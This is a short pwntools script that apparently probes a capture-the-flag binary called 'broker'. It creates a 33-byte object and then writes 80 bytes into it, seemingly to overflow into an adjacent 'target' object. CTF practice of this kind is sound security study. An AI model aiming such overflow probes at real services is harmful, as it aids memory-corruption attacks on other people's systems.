#!/usr/bin/env python3
from pwn import *


def send(io, line):
    io.sendline(line)
    io.stdin.flush()
    reply = io.recvline(timeout=5)
    print(repr(reply), flush=True)
    return reply


def main():
    io = process(
        ["./bin/broker"],
        env={"CTF_STDIO": "1"},
        stdin=PIPE,
        stdout=PIPE,
        stderr=PIPE,
    )
    print(repr(io.recvline(timeout=5)), flush=True)
    send(io, b"REGISTER alice")
    small = b"41" * 33
    send(io, b"CREATE s " + small)
    send(io, b"READ s")
    send(io, b"READ s")
    send(io, b"CREATE target 00")
    send(io, b"WRITE s " + b"42" * 80)
    send(io, b"READ s")
    send(io, b"LIST")
    io.close()


if __name__ == "__main__":
    main()
